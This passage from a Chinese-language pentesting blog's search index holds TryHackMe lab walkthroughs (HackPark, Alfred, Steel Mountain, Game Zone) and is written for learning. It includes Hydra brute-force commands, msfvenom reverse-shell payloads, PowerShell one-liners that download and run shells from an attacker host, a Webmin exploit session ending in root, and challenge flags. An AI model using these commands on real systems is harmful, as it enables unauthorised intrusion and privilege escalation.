0.0.0.0:10000 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - 总计5个。 ","date":"2024-01-07","objectID":"/2024/01/thm-game_zone/:5:1","tags":["THM"],"title":"TryHackMe -- Offensive Pentesting -- Game Zone","uri":"/2024/01/thm-game_zone/"},{"categories":["Pentesting"],"content":"What is the name of the exposed CMS? 上面的端口里，有个10000端口访问不到，怀疑是做了防火墙限制，也就是不出网。如果是这样，我们就需要使用代理把10000端口的服务反向代理出来，这里可以直接使用ssh： 然后在kali上直接访问kali的10000端口： 是一个Webmin的cms，直接用agent47/videogamer124登录访问，可以看到详细信息。 ","date":"2024-01-07","objectID":"/2024/01/thm-game_zone/:5:2","tags":["THM"],"title":"TryHackMe -- Offensive Pentesting -- Game Zone","uri":"/2024/01/thm-game_zone/"},{"categories":["Pentesting"],"content":"Privilege Escalation with Metasploit 想办法利用Webmin进行提权即可。 首先searchsploit搜索一下： 直接使用msf即可: 打完直接就是root权限了，这个没有涉及到提权： msf6 exploit(unix/webapp/webmin_show_cgi_exec) \u003e exploit [*] Started reverse TCP double handler on 10.2.124.22:4444 [*] Attempting to login... [+] Authentication successful [+] Authentication successful [*] Attempting to execute the payload... [+] Payload executed successfully [*] Accepted the first client connection... [*] Accepted the second client connection... [*] Command: echo E6mj7UoFjqWBNVOO; [*] Writing to socket A [*] Writing to socket B [*] Reading from sockets... [*] Matching... [*] B is input... [*] Command shell session 1 opened (10.2.124.22:4444 -\u003e 10.10.55.169:45412) at 2024-03-19 05:24:33 -0400 Shell Banner: E6mj7UoFjqWBNVOO ----- id uid=0(root) gid=0(root) groups=0(root) pwd /usr/share/webmin/file/ cat /root/root.txt a4b945830144bdd71908d12d902adeee ","date":"2024-01-07","objectID":"/2024/01/thm-game_zone/:6:0","tags":["THM"],"title":"TryHackMe -- Offensive Pentesting -- Game Zone","uri":"/2024/01/thm-game_zone/"},{"categories":["Pentesting"],"content":"总结 这个练习感觉思维比方法更重要，攻击路径是拿到第一个站点-\u003e 漏洞利用拿到用户名和密码 -\u003e 端口发现第二个站点 -\u003e 反带不出网机器 -\u003e 漏洞利用第二个站点拿管理员权限。 知识点： 反向代理（后续会出一个详细的关于代理的文章） sql注入 ","date":"2024-01-07","objectID":"/2024/01/thm-game_zone/:7:0","tags":["THM"],"title":"TryHackMe -- Offensive Pentesting -- Game Zone","uri":"/2024/01/thm-game_zone/"},{"categories":["Pentesting"],"content":"THM学习训练记录","date":"2024-01-06","objectID":"/2024/01/thm-hackpark/","tags":["THM"],"title":"TryHackMe -- HackPark","uri":"/2024/01/thm-hackpark/"},{"categories":["Pentesting"],"content":"HackPark Walkthrough. THM – HackPark ","date":"2024-01-06","objectID":"/2024/01/thm-hackpark/:0:0","tags":["THM"],"title":"TryHackMe -- HackPark","uri":"/2024/01/thm-hackpark/"},{"categories":["Pentesting"],"content":"Deploy the vulnerable Windows machine ","date":"2024-01-06","objectID":"/2024/01/thm-hackpark/:1:0","tags":["THM"],"title":"TryHackMe -- HackPark","uri":"/2024/01/thm-hackpark/"},{"categories":["Pentesting"],"content":"Whats the name of the clown displayed on the homepage? 简单的以图搜图。先扫端口： ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ sudo nmap -T4 -sV -Pn 10.10.62.181 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-07 06:17 EST Nmap scan report for localhost (10.10.62.181) Host is up (0.36s latency). Not shown: 998 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 8.5 3389/tcp open ssl/ms-wbt-server? Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 134.47 seconds 访问80端口，是一个blog，存在登录功能： ","date":"2024-01-06","objectID":"/2024/01/thm-hackpark/:1:1","tags":["THM"],"title":"TryHackMe -- HackPark","uri":"/2024/01/thm-hackpark/"},{"categories":["Pentesting"],"content":"Using Hydra to brute-force a login ","date":"2024-01-06","objectID":"/2024/01/thm-hackpark/:2:0","tags":["THM"],"title":"TryHackMe -- HackPark","uri":"/2024/01/thm-hackpark/"},{"categories":["Pentesting"],"content":"What request type is the Windows website login form using? 登录页面： 在登录时，并没有在url中拼接用户名和密码参数，所以使用的是post方法，想确认可以用burp抓包看一下： 首先搜一下默认用户名和密码： 尝试admin/admin登录，不对。但是提示我们登录后更改密码，所以大概率是admin的账号，但是密码修改了。 这里可以用burp对password进行单字段爆破： 但是这里是希望我们用hydra去进行爆破的，那就hydra整一次。 burp提取下需要使用的数据： # hydra -l \u003cusername\u003e -P /usr/share/wordlists/\u003cwordlist\u003e \u003cip\u003e http-post-form \"\u003cLogin Page\u003e:\u003cRequest Body\u003e:\u003cError Message\u003e\" ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.62.181 http-post-form \"/Account/login.aspx:__VIEWSTATE=4A%2FulX%2FkrreHn9c8sH3xUEppn5lC%2BvPRw8U%2F1b55wpRYFUyj4ioxPOlcaWuYjqezbyHe1o7BJdV4wPX4gml0SACd4zthGt9Kd91upXcwjUI8w7pNH4EVgtVg%2FK4PKqgnOg6ZKWerzWazWS9fMWRZKDW3SvyxhSNkQ1kLqvxqlqAnBD%2B3705ZnEyiQ93Sr9RRbGcSY1vV6R4ORM9HcyrE5NLqH906F262FKRSUCQHNo9YQtjmI6tiVFe9W%2FC%2BErobCXipKr%2F6VzFravYeEJL01qqHW8wYCkKJ7uj3UtpOHi9A4cqNWkurOyueACksOhN0wlTNcvB%2BayI2g%2Bi96TSNZUshMFqTpHbRNnlMdZaSI0dVXdQW\u0026__EVENTVALIDATION=J%2Flh8MFMXEyX%2FPFex0iFKvuSzQlOQm6HhB6dgr6vF%2FiPCa3aSTIXIDEC1qxC2xpYT0EkTyJpkU%2FlLHS7g9irDPAIs7Oi%2FAdfHs%2BFHrF19qXH%2FWZzn27lB5n3e9TPEBJEG%2F9o57mFirf9eqiy5rJh1g%2But1b6ua8ppMz4PWj9jQtr0dot\u0026ctl00%24MainContent%24LoginUser%24UserName=admin\u0026ctl00%24MainContent%24LoginUser%24Password=^PASS^\u0026ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed\" 速度看个人机器，我的时间久一点。 ","date":"2024-01-06","objectID":"/2024/01/thm-hackpark/:2:1","tags":["THM"],"title":"TryHackMe -- HackPark","uri":"/2024/01/thm-hackpark/"},{"categories":["Pentesting"],"content":"Compromise the machine ","date":"2024-01-06","objectID":"/2024/01/thm-hackpark/:3:0","tags":["THM"],"title":"TryHackMe -- HackPark","uri":"/2024/01/thm-hackpark/"},{"categories":["Pentesting"],"content":"Now you have logged into the website, are you able to identify the version of the BlogEngine? 这个看下about就可以：3.3.6.0 ","date":"2024-01-06","objectID":"/2024/01/thm-hackpark/:3:1","tags":["THM"],"title":"TryHackMe -- HackPark","uri":"/2024/01/thm-hackpark/"},{"categories":["Pentesting"],"content":"What is the CVE? ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ searchsploit blogengine.net ----------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ----------------------------------------------------------------------------------------------------------------------- --------------------------------- BlogEngine.NET 1.4 - 'search.aspx' Cross-Site Scripting | asp/webapps/32874.txt BlogEngine.NET 1.6 - Directory Traversal / Information Disclosure | asp/webapps/35168.txt BlogEngine.NET 3.3.6/3.3.7 - 'dirPath' Directory Traversal / Remote Code Execution | aspx/webapps/47010.py BlogEngine.NET 3.3.6/3.3.7 - 'path' Directory Traversal | aspx/webapps/47035.py BlogEngine.NET 3.3.6/3.3.7 - 'theme Cookie' Directory Traversal / Remote Code Execution | aspx/webapps/47011.py BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection | aspx/webapps/47014.py BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution | aspx/webapps/46353.cs ----------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Papers: No Results ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ searchsploit -p 46353 Exploit: BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution URL: https://www.exploit-db.com/exploits/46353 Path: /usr/share/exploitdb/exploits/aspx/webapps/46353.cs Codes: CVE-2019-6714 Verified: True File Type: HTML document, ASCII text ","date":"2024-01-06","objectID":"/2024/01/thm-hackpark/:3:2","tags":["THM"],"title":"TryHackMe -- HackPark","uri":"/2024/01/thm-hackpark/"},{"categories":["Pentesting"],"content":"Who is the webserver running as? 直接用上面的exp拿intial access。是个路径穿越导致远程代码执行的洞，利用方法如下： /* * CVE-2019-6714 * * Path traversal vulnerability leading to remote code execution. This * vulnerability affects BlogEngine.NET versions 3.3.6 and below. This * is caused by an unchecked \"theme\" parameter that is used to override * the default theme for rendering blog pages. The vulnerable code can * be seen in this file: * * /Custom/Controls/PostList.ascx.cs * * Attack: * * First, we set the TcpClient address and port within the method below to * our attack host, who has a reverse tcp listener waiting for a connection. * Next, we upload this file through the file manager. In the current (3.3.6) * version of BlogEngine, this is done by editing a post and clicking on the * icon that looks like an open file in the toolbar. Note that this file must * be uploaded as PostView.ascx. Once uploaded, the file will be in the * /App_Data/files directory off of the document root. The admin page that * allows upload is: * * http://10.10.10.10/admin/app/editor/editpost.cshtml * * * Finally, the vulnerability is triggered by accessing the base URL for the * blog with a theme override specified like so: * * http://10.10.10.10/?theme=../../App_Data/files * */ 改一下exp里监听的ip和端口，然后利用后台的上传把文件传上去，最后再访问一下，就能拿到反弹shell。 上传文件，exp重命名为PostView.ascx： 访问目标路径http://10.10.62.181/?theme=../../App_Data/files后拿到权限： ","date":"2024-01-06","objectID":"/2024/01/thm-hackpark/:3:3","tags":["THM"],"title":"TryHackMe -- HackPark","uri":"/2024/01/thm-hackpark/"},{"categories":["Pentesting"],"content":"Windows Privilege Escalation 基本思路：用现有的shell下载msf的payload，将当前的shell转移到msf中，进行后续的提权操作。 msfvenom生成payload： ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.2.124.22 LPORT=4444 -e x86/shikata_ga_nai -f exe -o shell.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload Found 1 compatible encoders Attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 381 (iteration=0) x86/shikata_ga_nai chosen with final size 381 Payload size: 381 bytes Final size of exe file: 73802 bytes Saved as: shell.exe kali开启msf监听： msf6 \u003e use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) \u003e set payload windows/meterpreter/reverse_tcp payload =\u003e windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) \u003e set lhost 10.2.124.22 lhost =\u003e 10.2.124.22 msf6 exploit(multi/handler) \u003e set lport 4444 lport =\u003e 4444 msf6 exploit(multi/handler) \u003e run [*] Started reverse TCP handler on 10.2.124.22:4444 payload目录下python开启web服务，在已经拿到的shell上使用powershell下载我们的payload： cd C:\\Windows\\Temp powershell -c wget \"http://10.2.124.22:8081/shell.exe\" -outfile \"shell.exe\" shell.exe 开启msf上的权限 ","date":"2024-01-06","objectID":"/2024/01/thm-hackpark/:4:0","tags":["THM"],"title":"TryHackMe -- HackPark","uri":"/2024/01/thm-hackpark/"},{"categories":["Pentesting"],"content":"What is the OS version of this windows machine? Windows 2012 R2 (6.3 Build 9600) ","date":"2024-01-06","objectID":"/2024/01/thm-hackpark/:4:1","tags":["THM"],"title":"TryHackMe -- HackPark","uri":"/2024/01/thm-hackpark/"},{"categories":["Pentesting"],"content":"What is the name of the abnormal service running? 拿到普通用户权限后，要准备提权。如果是msf，那么可以考虑使用msf内置的一些自动化工具，它会自动找到存在问题、可利用的服务等，第二种方式就是自己手动寻找。比较推荐第二种方法，更灵活、全面。 首先查看下进程信息： 红框中的进程比较值得关注，因为这些都不是系统常规进程，尤其是还有一个可能和计划任务有关。去C:\\Program Files (x86)\\SystemScheduler看下： 有个Events，看下里面： Message.exe进程是管理员权限运行的，而且是每分钟执行一次，那我们就可以考虑用它来进行提权了。 这里的问题答案是WindowsScheduler。 ","date":"2024-01-06","objectID":"/2024/01/thm-hackpark/:4:2","tags":["THM"],"title":"TryHackMe -- HackPark","uri":"/2024/01/thm-hackpark/"},{"categories":["Pentesting"],"content":"What is the name of the binary you’re supposed to exploit? Message.exe ","date":"2024-01-06","objectID":"/2024/01/thm-hackpark/:4:3","tags":["THM"],"title":"TryHackMe -- HackPark","uri":"/2024/01/thm-hackpark/"},{"categories":["Pentesting"],"content":"What is the user flag (on Jeffs Desktop)? 提权思路：直接替换Message.exe程序，因为是计划任务会自动启动该程序，那么就可以使用我们自己的payload来替换掉这个程序，这样在下次调用时，就会执行我们的payload，而且权限是Administartor权限： msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.2.124.22 LPORT=4446 -e x86/shikata_ga_nai -f exe -o Message.exe 在kali上进行监听即可: 拿到管理员权限，直接去读取对应的文件即可： 759bd8af507517bcfaede78a21a73e39 ","date":"2024-01-06","objectID":"/2024/01/thm-hackpark/:4:4","tags":["THM"],"title":"TryHackMe -- HackPark","uri":"/2024/01/thm-hackpark/"},{"categories":["Pentesting"],"content":"What is the root flag? 7e13d97f05f7ceb9881a3eb3d78d3e72 ","date":"2024-01-06","objectID":"/2024/01/thm-hackpark/:4:5","tags":["THM"],"title":"TryHackMe -- HackPark","uri":"/2024/01/thm-hackpark/"},{"categories":["Pentesting"],"content":"Privilege Escalation Without Metasploit 主要是看WinPEAS工具的使用，个人感觉在实战场景下除非是没有办法了，再上这种工具，因为公开的，特征比较明显，很容易被AV发现。虽然现在的版本已经开发了针对AV的混淆，但实战效果如何有待验证。 在这里我们使用WinPEAS这个工具：https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS 该工具会按照**book.hacktricks.xyz**上的checklist来进行全自动检查，发现能本地提权的方法。 现在该工具已经可以集成到msf中，作者开发了msf的module，直接在msf中调用module就可以实现WinPEAS的检查：https://github.com/carlospolop/PEASS-ng/tree/master/metasploit。module要求已经有一个session，然后会自动下载上传WinPEAS文件到目标上，并自动运行，但是在运行结束之前没有任何回显，需要一直等着。 这种方式还有一个好处是，module与一个PASSWORD选项，会对脚本内容进行加解密，避免明文传输WinPEAS被流量设备发现。 如果我们手动上传到目标机器，就需要手动执行一下，拿到结果。 meterpreter \u003e lls Listing Local: /home/v4ler1an/Documents/tools/privilegeEscalation/PEASS-ng/winPEAS/winPEASbat ============================================================================================= Mode Size Type Last modified Name ---- ---- ---- ------------- ---- 100644/rw-r--r-- 83 fil 2024-03-07 21:25:50 -0500 .gitattributes 100755/rwxr-xr-x 5306 fil 2024-03-07 21:25:50 -0500 README.md 100755/rwxr-xr-x 36179 fil 2024-03-07 21:25:50 -0500 winPEAS.bat meterpreter \u003e upload winPEAS.bat [*] Uploading : /home/v4ler1an/Documents/tools/privilegeEscalation/PEASS-ng/winPEAS/winPEASbat/winPEAS.bat -\u003e winPEAS.bat [*] Uploaded 35.33 KiB of 35.33 KiB (100.0%): /home/v4ler1an/Documents/tools/privilegeEscalation/PEASS-ng/winPEAS/winPEASbat/winPEAS.bat -\u003e winPEAS.bat [*] Completed : /home/v4ler1an/Documents/tools/privilegeEscalation/PEASS-ng/winPEAS/winPEASbat/winPEAS.bat -\u003e winPEAS.bat 接下来就是分析输出结果的工作了，看下WinPEAS的官方说明文档就好了。 ","date":"2024-01-06","objectID":"/2024/01/thm-hackpark/:5:0","tags":["THM"],"title":"TryHackMe -- HackPark","uri":"/2024/01/thm-hackpark/"},{"categories":["Pentesting"],"content":"总结 扫描 -\u003e 用户密码爆破 -\u003e 后台路径穿越导致RCE的漏洞 -\u003e 上传shell -\u003e 反弹shell -\u003e 替换计划任务中有Administrator权限的程序为shell进行提权。 Initial Access：用户密码爆破 -\u003e 后台路径穿越导致RCE的漏洞 Privilege Escalation：替换计划任务中有Administrator权限的程序为shell进行提权 ","date":"2024-01-06","objectID":"/2024/01/thm-hackpark/:6:0","tags":["THM"],"title":"TryHackMe -- HackPark","uri":"/2024/01/thm-hackpark/"},{"categories":["Pentesting"],"content":"THM学习训练记录","date":"2024-01-05","objectID":"/2024/01/thm-alfred/","tags":["THM"],"title":"TryHackMe -- Alfred","uri":"/2024/01/thm-alfred/"},{"categories":["Pentesting"],"content":"Alfred Walkthrough. THM - Alfred ","date":"2024-01-05","objectID":"/2024/01/thm-alfred/:0:0","tags":["THM"],"title":"TryHackMe -- Alfred","uri":"/2024/01/thm-alfred/"},{"categories":["Pentesting"],"content":"Initial Access ","date":"2024-01-05","objectID":"/2024/01/thm-alfred/:1:0","tags":["THM"],"title":"TryHackMe -- Alfred","uri":"/2024/01/thm-alfred/"},{"categories":["Pentesting"],"content":"How many ports are open? (TCP only) 端口扫描，直接nmap扫描即可： ┌──(v4ler1an㉿kali)-[~/Documents/tools] └─$ sudo nmap -T4 -sV -Pn 10.10.222.189 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-07 01:34 EST Nmap scan report for localhost (10.10.222.189) Host is up (0.36s latency). Not shown: 997 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 3389/tcp open tcpwrapped 8080/tcp open http Jetty 9.4.z-SNAPSHOT Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 30.31 seconds 这里没有扫描全端口，我个人的思路是先看常规端口，如果确定没有东西了，再去扫其他端口。 ","date":"2024-01-05","objectID":"/2024/01/thm-alfred/:1:1","tags":["THM"],"title":"TryHackMe -- Alfred","uri":"/2024/01/thm-alfred/"},{"categories":["Pentesting"],"content":"What is the username and password for the login panel? (in the format username:password) 需要找一个带登录框的页面，80端口没有，在8080端口找到了： 源码上没有东西，应该是要爆破。burp尝试一下： 最终发现admin/admin。 其实这里应该先尝试一下jenkins的默认账号密码，就是admin/admin。 ","date":"2024-01-05","objectID":"/2024/01/thm-alfred/:1:2","tags":["THM"],"title":"TryHackMe -- Alfred","uri":"/2024/01/thm-alfred/"},{"categories":["Pentesting"],"content":"What is the user.txt flag? 这里是希望我们使用Nishang工具，大概思路就是在jenkins的dashboard中找到一个能够执行命令的地方，把工具下载下来然后执行，在攻击机做监听就可以获得反弹shell。 首先，把需要用的脚本下载到攻击机https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1； 然后，kali开启web server，为了目标机器能访问到下载脚本：python -m http.server 8081； 回到jenkins，执行命令的地方在： 需要执行的命令： powershell iex (New-Object Net.WebClient).DownloadString(‘http://10.2.124.22:8081/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.2.124.22 -Port 4444 作用就是从kali下载文件，然后去执行命令，反弹shell到kali的4444端口。 kali本地开启监听，回到上层，点击build now： kali的监听，成功拿到shell： user.txt在bruce的桌面上。 有报错的话可以在执行的build历史中查看详细信息： ","date":"2024-01-05","objectID":"/2024/01/thm-alfred/:1:3","tags":["THM"],"title":"TryHackMe -- Alfred","uri":"/2024/01/thm-alfred/"},{"categories":["Pentesting"],"content":"Switching Shells 这一步其实在重复上面的步骤，我们可以不用powershell脚本，而是直接用msfvenom生成一个payload，然后把反弹shell引到msf上去。同理，使用cs也可以实现一样的效果。 需要执行的命令： ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.2.124.22 LPORT=4443 -f exe -o shell.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload Found 1 compatible encoders Attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 381 (iteration=0) x86/shikata_ga_nai chosen with final size 381 Payload size: 381 bytes Final size of exe file: 73802 bytes Saved as: shell.exe 修改一下project里要执行的命令： powershell \"(New-Object System.Net.WebClient).Downloadfile('http://10.2.124.22:8081/shell.exe','shell.exe')\" msf中： use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 10.2.124.22 set LPORT 4443 run msf6 exploit(multi/handler) \u003e run [*] Started reverse TCP handler on 10.2.124.22:4443 [*] Sending stage (176198 bytes) to 10.10.53.218 [*] Meterpreter session 1 opened (10.2.124.22:4443 -\u003e 10.10.53.218:49236) at 2024-03-07 04:05:29 -0500 meterpreter \u003e sysinfo Computer : ALFRED OS : Windows 7 (6.1 Build 7601, Service Pack 1). Architecture : x64 System Language : en_US Domain : WORKGROUP Logged On Users : 1 Meterpreter : x86/windows ","date":"2024-01-05","objectID":"/2024/01/thm-alfred/:2:0","tags":["THM"],"title":"TryHackMe -- Alfred","uri":"/2024/01/thm-alfred/"},{"categories":["Pentesting"],"content":"Privilege Escalation 拿到初始权限，下一步就是提权，这里希望我们使用假冒token来实现提权。关于token，看这https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens 记住两种主要的token就行，这里使用的是第二种。 Primary access tokens: those associated with a user account that are generated on log on Impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process 以下是几种经常被冒用的令牌： SeImpersonatePrivilege SeAssignPrimaryPrivilege SeTcbPrivilege SeBackupPrivilege SeRestorePrivilege SeCreateTokenPrivilege SeLoadDriverPrivilege SeTakeOwnershipPrivilege SeDebugPrivilege 在反弹shell里，使用whoami /priv可以看到当前的令牌权限： C:\\Program Files (x86)\\Jenkins\\workspace\\shell\u003ewhoami /priv whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State =============================== ========================================= ======== SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeSecurityPrivilege Manage auditing and security log Disabled SeTakeOwnershipPrivilege Take ownership of files or other objects Disabled SeLoadDriverPrivilege Load and unload device drivers Disabled SeSystemProfilePrivilege Profile system performance Disabled SeSystemtimePrivilege Change the system time Disabled SeProfileSingleProcessPrivilege Profile single process Disabled SeIncreaseBasePriorityPrivilege Increase scheduling priority Disabled SeCreatePagefilePrivilege Create a pagefile Disabled SeBackupPrivilege Back up files and directories Disabled SeRestorePrivilege Restore files and directories Disabled SeShutdownPrivilege Shut down the system Disabled SeDebugPrivilege Debug programs Enabled SeSystemEnvironmentPrivilege Modify firmware environment values Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeRemoteShutdownPrivilege Force shutdown from a remote system Disabled SeUndockPrivilege Remove computer from docking station Disabled SeManageVolumePrivilege Perform volume maintenance tasks Disabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled SeTimeZonePrivilege Change the time zone Disabled SeCreateSymbolicLinkPrivilege Create symbolic links Disabled 可以看到当前用户的SeDebugPrivilege、SeImpersonatePrivilege 、SeCreateGlobalPrivilege权限是开启的。 但是这里跟在meterpreter中获得结果不太一样： meterpreter \u003e getprivs Enabled Process Privileges ========================== Name ---- SeBackupPrivilege SeChangeNotifyPrivilege SeCreateGlobalPrivilege SeCreatePagefilePrivilege SeCreateSymbolicLinkPrivilege SeDebugPrivilege SeImpersonatePrivilege SeIncreaseBasePriorityPrivilege SeIncreaseQuotaPrivilege SeIncreaseWorkingSetPrivilege SeLoadDriverPrivilege SeManageVolumePrivilege SeProfileSingleProcessPrivilege SeRemoteShutdownPrivilege SeRestorePrivilege SeSecurityPrivilege SeShutdownPrivilege SeSystemEnvironmentPrivilege SeSystemProfilePrivilege SeSystemtimePrivilege SeTakeOwnershipPrivilege SeTimeZonePrivilege SeUndockPrivilege 然后准备提权，加载incognito，该模块是meterpreter中的一个模块，用来模拟用户token。 使用list_tokens -g查看token： meterpreter \u003e load incognito Loading extension incognito...Success. meterpreter \u003e list_tokens -g [-] Warning: Not currently running as SYSTEM, not all tokens will be available Call rev2self if primary process token is SYSTEM Delegation Tokens Available ======================================== \\ BUILTIN\\Administrators --\u003e 存在administrator的token BUILTIN\\Users NT AUTHORITY\\Authenticated Users NT AUTHORITY\\NTLM Authentication NT AUTHORITY\\SERVICE NT AUTHORITY\\This Organization NT SERVICE\\AudioEndpointBuilder NT SERVICE\\CertPropSvc NT SERVICE\\CscService NT SERVICE\\iphlpsvc NT SERVICE\\LanmanServer NT SERVICE\\PcaSvc NT SERVICE\\Schedule NT SERVICE\\SENS NT SERVICE\\SessionEnv NT SERVICE\\TrkWks NT SERVICE\\UmRdpService NT SERVICE\\UxSms NT SERVICE\\Winmgmt NT SERVICE\\wuauserv Impersonation Tokens Available ======================================== No tokens available 使用命令impersona","date":"2024-01-05","objectID":"/2024/01/thm-alfred/:3:0","tags":["THM"],"title":"TryHackMe -- Alfred","uri":"/2024/01/thm-alfred/"},{"categories":["Pentesting"],"content":"总结 整体来说常规思路，目的就是熟悉jenkins这个软件，至于后续的提权什么的，属于常规思路。 扫 -\u003e 弱口令 -\u003e 功能利用 -\u003e 提权 ","date":"2024-01-05","objectID":"/2024/01/thm-alfred/:4:0","tags":["THM"],"title":"TryHackMe -- Alfred","uri":"/2024/01/thm-alfred/"},{"categories":["Pentesting"],"content":"THM学习训练记录","date":"2024-01-04","objectID":"/2024/01/thm-steal_mountain/","tags":["THM"],"title":"TryHackMe -- Steal Mountain","uri":"/2024/01/thm-steal_mountain/"},{"categories":["Pentesting"],"content":"Steal Mountain Walkthrough. THM - Steal Mountain ","date":"2024-01-04","objectID":"/2024/01/thm-steal_mountain/:0:0","tags":["THM"],"title":"TryHackMe -- Steal Mountain","uri":"/2024/01/thm-steal_mountain/"},{"categories":["Pentesting"],"content":"Who is the employee of the month? 首先全端口服务和脚本扫描： ┌──(v4ler1an㉿kali)-[~/Documents/tmp] └─$ sudo nmap -T4 -sC -sV -oN nmap.out -p- 10.10.33.145 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-06 01:43 EST Warning: 10.10.33.145 giving up on port because retransmission cap hit (6). Nmap scan report for localhost (10.10.33.145) Host is up (0.35s latency). Not shown: 65514 closed tcp ports (reset) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 8.5 |_http-title: Site doesn't have a title (text/html). |_http-server-header: Microsoft-IIS/8.5 | http-methods: |_ Potentially risky methods: TRACE 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 3365/tcp filtered contentserver 3389/tcp open ssl/ms-wbt-server? | ssl-cert: Subject: commonName=steelmountain | Not valid before: 2024-03-05T06:42:04 |_Not valid after: 2024-09-04T06:42:04 | rdp-ntlm-info: | Target_Name: STEELMOUNTAIN | NetBIOS_Domain_Name: STEELMOUNTAIN | NetBIOS_Computer_Name: STEELMOUNTAIN | DNS_Domain_Name: steelmountain | DNS_Computer_Name: steelmountain | Product_Version: 6.3.9600 |_ System_Time: 2024-03-06T07:14:09+00:00 |_ssl-date: 2024-03-06T07:14:16+00:00; -1s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 8080/tcp open http HttpFileServer httpd 2.3 |_http-title: HFS / |_http-server-header: HFS 2.3 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 48566/tcp filtered unknown 48982/tcp filtered unknown 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49169/tcp open msrpc Microsoft Windows RPC 49170/tcp open msrpc Microsoft Windows RPC 51012/tcp filtered unknown 57482/tcp filtered unknown 60236/tcp filtered unknown Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3:0:2: |_ Message signing enabled but not required | smb-security-mode: | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) |_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: \u003cunknown\u003e, NetBIOS MAC: 02:79:9d:b1:65:7b (unknown) | smb2-time: | date: 2024-03-06T07:14:08 |_ start_date: 2024-03-06T06:41:55 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 1871.24 seconds 开了80端口，139/445端口。先看80端口： 只有一张图片，看下源码： \u003c!doctype html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\"\u003e \u003ctitle\u003eSteel Mountain\u003c/title\u003e \u003cstyle\u003e * {font-family: Arial;} \u003c/style\u003e \u003c/head\u003e \u003cbody\u003e\u003ccenter\u003e \u003ca href=\"index.html\"\u003e\u003cimg src=\"/img/logo.png\" style=\"width:500px;height:300px;\"/\u003e\u003c/a\u003e \u003ch3\u003eEmployee of the month\u003c/h3\u003e \u003cimg src=\"/img/BillHarper.png\" style=\"width:200px;height:200px;\"/\u003e \u003c/center\u003e \u003c/body\u003e \u003c/html\u003e 发现图片的名字，BillHarper。 ","date":"2024-01-04","objectID":"/2024/01/thm-steal_mountain/:1:0","tags":["THM"],"title":"TryHackMe -- Steal Mountain","uri":"/2024/01/thm-steal_mountain/"},{"categories":["Pentesting"],"content":"Initial Access 